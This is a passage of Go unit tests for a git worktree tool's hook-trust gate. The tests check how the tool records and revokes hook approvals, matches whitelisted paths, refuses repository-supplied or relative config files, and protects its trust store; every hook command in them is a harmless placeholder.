	writeRepoConfig(t, repoDir, "[hooks]\npost_remove = [\"true\"]\n")

	trust, err := hookSetTrust(hookSourceRepoConfig)
	if err != nil {
		t.Fatal(err)
	}
	if err := trustHookSet(trust); err != nil {
		t.Fatal(err)
	}

	// The directory wt was standing in goes away, as it does under wt remove.
	gone := filepath.Join(repoDir, "sub")
	if err := os.Mkdir(gone, 0o755); err != nil {
		t.Fatal(err)
	}
	t.Chdir(gone)
	if err := os.RemoveAll(gone); err != nil {
		t.Fatal(err)
	}

	after, err := hookSetTrust(hookSourceRepoConfig)
	if err != nil {
		t.Fatalf("trust lookup failed once the working directory was gone: %v", err)
	}
	if !after.trusted {
		t.Fatal("approval was lost once the working directory was gone")
	}
}

// TestPromptAllStillAsksWhenTheTrustStoreIsUnreadable: prompt-all never
// consults trust to decide, so a store it cannot read must not turn into a
// silent skip. Non-interactive here, so the answer is still no — but the
// request has to be the one that reaches the user, not a trust-store error.
func TestPromptAllStillAsksWhenTheTrustStoreIsUnreadable(t *testing.T) {
	withIsolatedTrustStore(t)
	withPolicy(t, hookPolicyPromptAll)
	repoWithHooks(t, "[hooks]\npost_create = [\"echo shown-to-the-user\"]\n")

	path := trustFilePath()
	if err := os.MkdirAll(filepath.Dir(path), 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(path, []byte("not toml ]["), 0o600); err != nil {
		t.Fatal(err)
	}

	stderr := captureStderr(t)
	if err := runHooks("post_create", getHooks("post_create"), map[string]string{}); err != nil {
		t.Fatal(err)
	}
	out := stderr()

	if !strings.Contains(out, "echo shown-to-the-user") {
		t.Errorf("the commands were never put to the user, got:\n%s", out)
	}
	if strings.Contains(out, "skipping post_create hooks from .wt.toml") {
		t.Errorf("an unreadable store short-circuited a prompt-all decision, got:\n%s", out)
	}
}

// captureStderr redirects os.Stderr for the duration of a test and returns a
// function yielding what was written.
func captureStderr(t *testing.T) func() string {
	t.Helper()
	r, w, err := os.Pipe()
	if err != nil {
		t.Fatal(err)
	}
	saved := os.Stderr
	os.Stderr = w

	done := make(chan string, 1)
	go func() {
		var buf bytes.Buffer
		_, _ = io.Copy(&buf, r)
		done <- buf.String()
	}()

	var out string
	var once sync.Once
	read := func() string {
		once.Do(func() {
			os.Stderr = saved
			_ = w.Close()
			out = <-done
			_ = r.Close()
		})
		return out
	}
	t.Cleanup(func() { read() })
	return read
}

// TestUnrecognisedSourceIsNotTrusted is the property the old gate got backwards.
// A hook arriving under a label nothing has been taught about must fall to the
// deny side, and must not be recordable either — an approval wt cannot key on
// anything would be one that never matches again, or worse, matches too much.
func TestUnrecognisedSourceIsNotTrusted(t *testing.T) {
	withIsolatedTrustStore(t)
	withPolicy(t, hookPolicyPromptUntrusted)
	withoutTrustWhitelist(t)

	savedSources, savedHooks, savedDeclared := hookSources, worktreeHooks, declaredHooks
	hookSources = map[string]string{"post_create": "git config (local)"}
	worktreeHooks = Hooks{PostCreate: []string{"true"}}
	declaredHooks = map[string]Hooks{"git config (local)": worktreeHooks}
	t.Cleanup(func() {
		hookSources, worktreeHooks, declaredHooks = savedSources, savedHooks, savedDeclared
	})

	trust, err := hookSetTrust("git config (local)")
	if err != nil {
		t.Fatal(err)
	}
	if trust.trusted {
		t.Fatal("a source nothing knows about was trusted")
	}
	if offersTrust(trust, hookPolicyPromptUntrusted) {
		t.Error("prompt offered to remember an approval it has nowhere to file")
	}
	if err := trustHookSet(trust); err == nil {
		t.Error("trustHookSet() recorded an approval for an unscoped source")
	}

	dir := t.TempDir()
	marker := filepath.Join(dir, "ran")
	if err := runHooks("post_create", []string{"touch " + marker}, map[string]string{}); err != nil {
		t.Fatal(err)
	}
	if _, err := os.Stat(marker); err == nil {
		t.Fatal("hooks from an unrecognised source ran unprompted")
	}
}

// TestTrustWhitelist covers the [trust] escape hatch, including the sibling
// directory a naive string prefix would wrongly swallow.
func TestTrustWhitelist(t *testing.T) {
	root := t.TempDir()
	mine := filepath.Join(root, "mine")
	sibling := filepath.Join(root, "mine-from-the-internet")
	named := filepath.Join(root, "named")
	for _, d := range []string{mine, sibling, named} {
		if err := os.MkdirAll(filepath.Join(d, "repo"), 0o755); err != nil {
			t.Fatal(err)
		}
	}

	savedPrefix, savedExact := trustPrefixes, trustExact
	trustPrefixes = []string{mine, "", "   "}
	trustExact = []string{filepath.Join(named, "repo")}
	t.Cleanup(func() { trustPrefixes, trustExact = savedPrefix, savedExact })

	tests := []struct {
		name    string
		repoKey string
		want    bool
	}{
		{"repo under a prefix", filepath.Join(mine, "repo", ".git"), true},
		{"the prefix itself", filepath.Join(mine, ".git"), true},
		{"exact match", filepath.Join(named, "repo", ".git"), true},
		{"sibling sharing a name prefix", filepath.Join(sibling, "repo", ".git"), false},
		{"unrelated tree", filepath.Join(root, "other", ".git"), false},
		{"exact rule does not cover children", filepath.Join(named, "repo", "sub", ".git"), false},
		{"the user's own config is not path-scoped", trustScopeUser, false},
		{"no key at all", "", false},
	}
	for _, tt := range tests {
		if got := trustWhitelistAllows(tt.repoKey); got != tt.want {
			t.Errorf("%s: trustWhitelistAllows(%q) = %v, want %v", tt.name, tt.repoKey, got, tt.want)
		}
	}
}

// TestTrustRulesAreLiteralPaths: a [trust] rule is the one place wt does not
// expand environment variables. os.ExpandEnv turns what it cannot resolve into
// nothing and the path closes over the gap, so a rule shortens instead of
// failing: "$SRC/Users" becomes "/Users", which exists and holds every
// repository on the machine. Every route below reaches that same collapse, and
// spotting them one at a time is a losing game — not expanding ends it.
func TestTrustRulesAreLiteralPaths(t *testing.T) {
	root := t.TempDir()
	repo := filepath.Join(root, "repo")
	if err := os.MkdirAll(repo, 0o755); err != nil {
		t.Fatal(err)
	}
	repoKey := filepath.Join(repo, ".git")

	savedPrefix, savedExact := trustPrefixes, trustExact
	t.Cleanup(func() { trustPrefixes, trustExact = savedPrefix, savedExact })

	const name = "WT_TEST_TRUST_ROOT"
	// Set, so the rules below are rejected for referring to a variable at all
	// rather than for referring to a missing one.
	t.Setenv(name, root)
	if err := os.Unsetenv("WT_TEST_TRUST_MISSING"); err != nil {
		t.Fatal(err)
	}

	for _, entry := range []string{
		"$" + name,                      // set, and still not expanded
		"$WT_TEST_TRUST_MISSING" + root, // unset: the classic collapse
		"$$" + root,                     // "$$" is not an escape; Go maps the name "$"
		"${}" + root,                    // malformed, and silently eaten
		"%" + name + "%",                // %VAR%, which expands recursively on Windows
		string(filepath.Separator),      // no variable needed to name the root
		filepath.Base(repo),             // relative: matches nothing, whatever the cwd
		".",
	} {
		for _, check := range []struct {
			kind string
			set  func()
		}{
			{"prefix", func() { trustPrefixes, trustExact = []string{entry}, nil }},
			{"exact", func() { trustPrefixes, trustExact = nil, []string{entry} }},
		} {
			// Cleared per check, not per entry: the notice is recorded once per
			// rule per process, so a prefix check that reported would otherwise
			// stand in for an exact check that never did.
			trustRuleWarnings.Delete(entry)
			check.set()

			if trustWhitelistAllows(repoKey) {
				t.Errorf("%s = [%q] whitelisted %s", check.kind, entry, repo)
			}
			// Ignoring a rule silently is its own bug: the user wrote it to have
			// an effect and would have no way to find out it has none.
			if _, reported := trustRuleWarnings.Load(entry); !reported {
				t.Errorf("%s = [%q] was ignored without saying so", check.kind, entry)
			}
		}
	}

	// On Unix a trailing space is part of a directory's name, so a rule carrying
	// one names a directory that does not exist here. Trimming it would widen the
	// rule to one that does, and that holds every repository below it. Not
	// reported, unlike the entries above: this is a well-formed rule that matches
	// nothing, which is also what a rule for a tree you have not cloned yet looks
	// like.
	//
	// Windows is excluded rather than asserted the other way: Win32 strips
	// trailing spaces from a path component, so the rule resolves to the same
	// single directory it would have without one, and there is no narrower
	// directory it could have meant. wt is not doing the trimming, and asserting
	// that it lands on `root` would be a test of Win32, not of wt.
	if runtime.GOOS != "windows" {
		trustPrefixes, trustExact = []string{root + " "}, nil
		if trustWhitelistAllows(repoKey) {
			t.Errorf("prefix = [%q] was trimmed and matched %s", root+" ", repo)
		}
	}

	// Written out, the rule works — this rejects rules that name nothing, not
	// rules in general.
	trustPrefixes, trustExact = []string{root}, nil
	if !trustWhitelistAllows(repoKey) {
		t.Errorf("a literal [trust] prefix %q did not match %s", root, repo)
	}

	// And "~" still expands, which is what makes a portable rule possible
	// without variables.
	t.Setenv("HOME", root)
	t.Setenv("USERPROFILE", root) // os.UserHomeDir reads this on Windows
	trustPrefixes, trustExact = []string{"~"}, nil
	if !trustWhitelistAllows(repoKey) {
		t.Error("a [trust] prefix of \"~\" stopped matching under the home directory")
	}
}

// TestTrustStoreDoesNotFollowTheWorkingDirectory: wt runs from inside a working
// tree, so a relative config directory resolves against it and the trust store
// becomes a committable file — a cloned repo could ship approvals for its own
// hooks, and the same setting would mean a different file in every repository.
// Per the XDG spec a relative XDG_CONFIG_HOME is invalid and ignored; an unset
// HOME leaves nowhere to record anything, and the honest answer there is that
// nothing is approved rather than a path in the repository.
//
// What this does not claim: that an absolute override cannot name a directory
// inside some repository. XDG_CONFIG_HOME=/srv/repo/.config is a fixed
// directory the user chose, the same one in every repository they enter, and
// keeping approvals under a git-tracked home is their business — see
// docs/configuration.md.
func TestTrustStoreDoesNotFollowTheWorkingDirectory(t *testing.T) {
	repo := t.TempDir()
	t.Chdir(repo)

	t.Run("relative XDG_CONFIG_HOME is ignored", func(t *testing.T) {
		t.Setenv("HOME", t.TempDir())
		t.Setenv("XDG_CONFIG_HOME", ".config")
		configHomeWarnings.Delete("XDG_CONFIG_HOME")

		got := trustFilePath()
		if !filepath.IsAbs(got) {
			t.Fatalf("trust store path %q is relative", got)
		}
		if strings.HasPrefix(got, repo+string(filepath.Separator)) {
			t.Errorf("trust store landed inside the repository: %s", got)
		}
	})

	t.Run("no home means no store", func(t *testing.T) {
		// UserHomeDir reads HOME on unix and USERPROFILE on Windows.
		t.Setenv("HOME", "")
		t.Setenv("USERPROFILE", "")
		t.Setenv("XDG_CONFIG_HOME", "")
		t.Setenv("APPDATA", "")

		if got := trustFilePath(); got != "" {
			t.Fatalf("trustFilePath() = %q, want \"\" when there is no home", got)
		}
		if _, err := loadTrustStore(); !errors.Is(err, errNoTrustStoreDir) {
			t.Errorf("loadTrustStore() error = %v, want errNoTrustStoreDir", err)
		}
		// Saving has to refuse too: MkdirAll(filepath.Dir("")) is MkdirAll("."),
		// which would happily write ./trust.toml into the working tree.
		if err := saveTrustStore(trustStore{}); !errors.Is(err, errNoTrustStoreDir) {
			t.Errorf("saveTrustStore() error = %v, want errNoTrustStoreDir", err)
		}
		if _, err := os.Stat(filepath.Join(repo, "trust.toml")); !errors.Is(err, os.ErrNotExist) {
			t.Error("saveTrustStore wrote a trust store into the working tree")
		}
	})
}

// TestUntrustSaysWhenAWhitelistRuleStillApplies: a whitelisted repository never
// had a record to revoke, so `wt untrust` reaches the "nothing to revoke" branch
// — the one place a user is most likely to read the outcome as "gated now".
// Both branches have to mention the rule that keeps the hooks running.
func TestUntrustSaysWhenAWhitelistRuleStillApplies(t *testing.T) {
	withIsolatedTrustStore(t)

	root := t.TempDir()
	repo := filepath.Join(root, "repo")
	if err := os.MkdirAll(repo, 0o755); err != nil {
		t.Fatal(err)
	}

	savedPrefix, savedExact := trustPrefixes, trustExact
	trustPrefixes = []string{root}
	trustExact = nil
	savedFn := repoTrustKeyFn
	repoTrustKeyFn = func() (string, error) { return filepath.Join(repo, ".git"), nil }
	savedGlobal := untrustGlobal
	untrustGlobal = false
	t.Cleanup(func() {
		trustPrefixes, trustExact = savedPrefix, savedExact
		repoTrustKeyFn, untrustGlobal = savedFn, savedGlobal
	})

	var err error
	out := captureStdout(t, func() { err = runUntrust(nil) })
	if err != nil {
		t.Fatal(err)
	}
	if !strings.Contains(out, "Nothing to revoke") {
		t.Fatalf("expected the no-record branch, got:\n%s", out)
	}
	if !strings.Contains(out, "[trust] rule") {
		t.Errorf("untrust did not say a [trust] rule still covers the repo:\n%s", out)
	}
}

// TestUntrustGlobalRevokesTheConfigFileApproval: the config file's approval is
// not pinned to a repository, so "wt untrust" standing in one cannot reach it.
func TestUntrustGlobalRevokesTheConfigFileApproval(t *testing.T) {
	withIsolatedTrustStore(t)
	withPolicy(t, hookPolicyPromptUntrusted)
	withConfigFileHooks(t, "post_create", "true")

	trust, err := hookSetTrust(hookSourceConfigFile)
	if err != nil {
		t.Fatal(err)
	}
	if err := trustHookSet(trust); err != nil {
		t.Fatal(err)
	}

	savedFn := repoTrustKeyFn
	repoTrustKeyFn = func() (string, error) { return "/somewhere/.git", nil }
	savedGlobal := untrustGlobal
	t.Cleanup(func() { repoTrustKeyFn, untrustGlobal = savedFn, savedGlobal })

	untrustGlobal = false
	if err := runUntrust(nil); err != nil {
		t.Fatal(err)
	}
	if after, err := hookSetTrust(hookSourceConfigFile); err != nil {
		t.Fatal(err)
	} else if !after.trusted {
		t.Fatal("plain 'wt untrust' revoked an approval belonging to another scope")
	}

	untrustGlobal = true
	if err := runUntrust(nil); err != nil {
		t.Fatal(err)
	}
	if after, err := hookSetTrust(hookSourceConfigFile); err != nil {
		t.Fatal(err)
	} else if after.trusted {
		t.Fatal("wt untrust --global did not revoke the config file's approval")
	}
}

// TestRepoConfigIsNeverYourConfigFile: [trust] and hooks_policy are honoured
// from the config file precisely because it is yours. Point --config or
// WT_CONFIG at a repository's own .wt.toml and that stops being true — the file
// is read as both layers, and the repository whitelists itself. WT_CONFIG is the
// way in: set once, it names a different file in every repository entered.
func TestRepoConfigIsNeverYourConfigFile(t *testing.T) {
	savedFlag, savedFn := configFlag, gitRepoRootFn
	savedHooks, savedSources, savedPolicy := worktreeHooks, hookSources, hooksPolicy
	savedPrefix, savedExact := trustPrefixes, trustExact
	t.Cleanup(func() {
		configFlag, gitRepoRootFn = savedFlag, savedFn
		worktreeHooks, hookSources, hooksPolicy = savedHooks, savedSources, savedPolicy
		trustPrefixes, trustExact = savedPrefix, savedExact
		loadWorktreeConfig()
	})

	// Named rather than t.TempDir() directly: the last component has to have a
	// case to vary for the spelling at the end of the table below, and a temp
	// directory's "001" does not.
	repoDir := filepath.Join(t.TempDir(), "repo")
	if err := os.MkdirAll(repoDir, 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(repoDir, ".wt.toml"), []byte(`hooks_policy = "off"

[trust]
exact = ["`+filepath.ToSlash(repoDir)+`"]

[hooks]
post_create = ["theirs"]
`), 0o644); err != nil {
		t.Fatal(err)
	}
	gitRepoRootFn = func() (string, error) { return repoDir, nil }
	configFlag = ""

	// A second file, under a name of the repository's choosing: WT_CONFIG does
	// not have to say .wt.toml for a repository to be able to commit what it
	// names. This one supplies only the whitelist; the .wt.toml above supplies
	// the hooks it exempts.
	if err := os.WriteFile(filepath.Join(repoDir, "wt-user.toml"), []byte(`[trust]
exact = ["`+filepath.ToSlash(repoDir)+`"]
`), 0o644); err != nil {
		t.Fatal(err)
	}
	// And one outside the repository pointing back into it, which no comparison
	// of names would catch.
	linked := filepath.Join(t.TempDir(), "config.toml")
	if err := os.Symlink(filepath.Join(repoDir, ".wt.toml"), linked); err != nil {
		t.Skipf("symlinks unavailable: %v", err)
	}

	for _, spelling := range []string{
		filepath.Join(repoDir, ".wt.toml"),
		filepath.Join(repoDir, ".", ".wt.toml"),
		filepath.Join(repoDir, "wt-user.toml"),
		linked,
		// The repository's own directory spelled in a different case, which
		// os.Open resolves to the same committed file on macOS and Windows while
		// a byte comparison calls the file yours. Refused on every platform: the
		// comparison is folded, so on a case-sensitive filesystem this is a path
		// that does not exist and is declined rather than read either way.
		// sameFile is no backstop here — it only knows about .wt.toml.
		filepath.Join(filepath.Dir(repoDir), strings.ToUpper(filepath.Base(repoDir)), "wt-user.toml"),
	} {
		t.Setenv("WT_CONFIG", spelling)
		stderr := captureStderr(t)
		loadWorktreeConfig()
		out := stderr()

		if configFileFound {
			t.Errorf("WT_CONFIG=%q was read as the config file", spelling)
		}
		if len(trustPrefixes) > 0 || len(trustExact) > 0 {
			t.Errorf("WT_CONFIG=%q let the repository whitelist itself: prefix=%v exact=%v",
				spelling, trustPrefixes, trustExact)
		}
		if hooksPolicy != "" {
			t.Errorf("WT_CONFIG=%q let the repository set hooks_policy = %q", spelling, hooksPolicy)
		}
		// Refused as the config file, still present as what it is.
		if got := hookSources["post_create"]; got != hookSourceRepoConfig {
			t.Errorf("hookSources[post_create] = %q, want %q", got, hookSourceRepoConfig)
		}
		if !strings.Contains(out, filepath.Base(spelling)) {
			t.Errorf("nothing said about ignoring %q; the user would see settings vanish for no reason", spelling)
		}
	}
}

// TestRelativeConfigPathIsRefused: a relative --config or WT_CONFIG names a
// different file in every directory wt runs in, so whatever is checked out
// there supplies it — and a config file can whitelist the repository it sits in.
//
// Containment against the current repository does not cover this on its own.
// "../wt-user.toml" is outside the repository by every such test, and inside
// the superproject that vendored it as a submodule, which ships both halves.
func TestRelativeConfigPathIsRefused(t *testing.T) {
	savedFlag, savedFn := configFlag, gitRepoRootFn
	savedPrefix, savedExact := trustPrefixes, trustExact
	t.Cleanup(func() {
		configFlag, gitRepoRootFn = savedFlag, savedFn
		trustPrefixes, trustExact = savedPrefix, savedExact
		loadWorktreeConfig()
	})

	// A superproject holding the config, and the submodule wt is run from. The
	// submodule is its own toplevel, so ".." reaches content it does not own.
	super := t.TempDir()
	submodule := filepath.Join(super, "vendor", "lib")
	if err := os.MkdirAll(submodule, 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(super, "vendor", "wt-user.toml"), []byte(`[trust]
prefix = ["`+filepath.ToSlash(super)+`"]
`), 0o644); err != nil {
		t.Fatal(err)
	}
	t.Chdir(submodule)
	gitRepoRootFn = func() (string, error) { return submodule, nil }
	configFlag = ""

	for _, spelling := range []string{
		filepath.Join("..", "wt-user.toml"),
		"wt-user.toml",
		filepath.Join(".", "wt-user.toml"),
	} {
		t.Setenv("WT_CONFIG", spelling)
		trustPrefixes, trustExact = nil, nil
		stderr := captureStderr(t)
		loadWorktreeConfig()
		out := stderr()

		if configFileFound {
			t.Errorf("WT_CONFIG=%q was read as the config file", spelling)
		}
		if len(trustPrefixes) > 0 || len(trustExact) > 0 {
			t.Errorf("WT_CONFIG=%q whitelisted %v / %v", spelling, trustPrefixes, trustExact)
		}
		if !strings.Contains(out, "absolute") {
			t.Errorf("WT_CONFIG=%q was ignored without saying why:\n%s", spelling, out)
		}
	}
}

// TestDotfilesConfigAppliesInsideItsOwnRepo pins the other side of that line.
//
// Keeping your config in a dotfiles repository and symlinking it into
// ~/.config/wt is the ordinary setup, and standing in that repository must not
// make your own settings evaporate — root and pattern would go with them and the
// worktree would land somewhere else. The path is judged as written, so this
// keeps working; only a symlink whose target is the repository's own .wt.toml is
// refused, because that file has a repository-side job and would be gaining the
// wider scope.
//
// Nothing is conceded by allowing it: that file is already your config in every
// other repository, so a commit that turns it hostile does not need wt to be
// standing anywhere in particular.
func TestDotfilesConfigAppliesInsideItsOwnRepo(t *testing.T) {
	savedFlag, savedFn := configFlag, gitRepoRootFn
	savedRoot, savedSources := worktreeRoot, configSources
	t.Cleanup(func() {
		configFlag, gitRepoRootFn = savedFlag, savedFn
		worktreeRoot, configSources = savedRoot, savedSources
		loadWorktreeConfig()
	})

	dotfiles := t.TempDir()
	inRepo := filepath.Join(dotfiles, "wt", "config.toml")
	if err := os.MkdirAll(filepath.Dir(inRepo), 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(inRepo, []byte(
		"root = \""+filepath.ToSlash(filepath.Join(dotfiles, "wts"))+"\"\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	linked := filepath.Join(t.TempDir(), "config.toml")
	if err := os.Symlink(inRepo, linked); err != nil {
		t.Skipf("symlinks unavailable: %v", err)
	}

	gitRepoRootFn = func() (string, error) { return dotfiles, nil }
	configFlag = ""
	t.Setenv("WT_CONFIG", linked)
	loadWorktreeConfig()

	if !configFileFound {
		t.Fatal("a config symlinked into a dotfiles repo stopped being read while standing in it")
	}
	// Cleaned on both sides: the config file has to spell the path with forward
	// slashes to be valid TOML on Windows, and wt keeps a setting as written.
	want := filepath.Join(dotfiles, "wts")
	if filepath.Clean(worktreeRoot) != filepath.Clean(want) {
		t.Errorf("worktreeRoot = %q, want %q — the worktree would be created somewhere else", worktreeRoot, want)
	}
}

// TestNewerTrustStoreIsNotOverwritten: an unrecognised version is only safe to
// read as "nothing approved" when it is older. A newer store means another wt
// wrote it, and treating it as empty would delete its approvals on the next
// write — on a machine where both versions are installed, every run undoing the
// other's.
func TestNewerTrustStoreIsNotOverwritten(t *testing.T) {
	withIsolatedTrustStore(t)

	path := trustFilePath()
	if err := os.MkdirAll(filepath.Dir(path), 0o755); err != nil {
		t.Fatal(err)
	}
	original := []byte("version = " + fmt.Sprint(trustStoreVersion+1) + `

[[approved]]
scope = "/some/repo/.git"
sha256 = "whatever a later wt puts here"
`)
	if err := os.WriteFile(path, original, 0o644); err != nil {
		t.Fatal(err)
	}

	if _, err := loadTrustStore(); err == nil {
		t.Fatal("a newer trust store was read as if this wt understood it")
	}

	// The write path goes through the read path, so refusing to read is what
	// keeps the file intact.
	if err := trustHookSet(hookTrust{scope: "/some/other/repo/.git", source: hookSourceRepoConfig, sha: "abc"}); err == nil {
		t.Error("trustHookSet() wrote to a store it could not read")
	}
	after, err := os.ReadFile(path)
	if err != nil {
		t.Fatal(err)
	}
	if !bytes.Equal(after, original) {
		t.Errorf("the newer store was rewritten:\n%s", after)
	}
}
